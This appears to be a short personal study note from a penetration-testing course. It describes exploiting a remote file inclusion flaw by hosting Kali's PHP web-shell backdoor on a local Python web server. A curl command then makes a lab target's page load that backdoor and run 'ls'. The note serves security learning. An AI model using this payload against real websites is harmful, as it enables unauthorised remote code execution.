#### First of all doing [[Identifying and exploring directory traversals|scan for explore dir traversals vuln]]

---

### Preparing to use scripts remotly

1. On kali linux we have some php backdoor scripts
	- `/usr/share/webshells/php/`
	- We will use `simple-backdoor.php` to test `LFI` vulnerability
2. To leverage[^1] an RFI vulnerability, we need to make the remote file accessible by the target(Creating the server by {[[Python|python3 -m http.server 80]]})

---
### Exploiting[^2] RFI with a PHP backdoor and execution of ls

Now we using [[Curl|curl]] with target URL and our server's ip and name of php backdoor 

```bash
curl "http://mountaindesserts.com/meteor/index.php?
page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

1. `"http://mountaindesserts.com/meteor/index.php?page=` - Basic part of all [[Curl|curl]]
2. `http://192.168.119.3/simple-backdoor.php` - Remote part with ip address and name of php backdoor
3. `&cmd=ls` - executing command `ls`
`
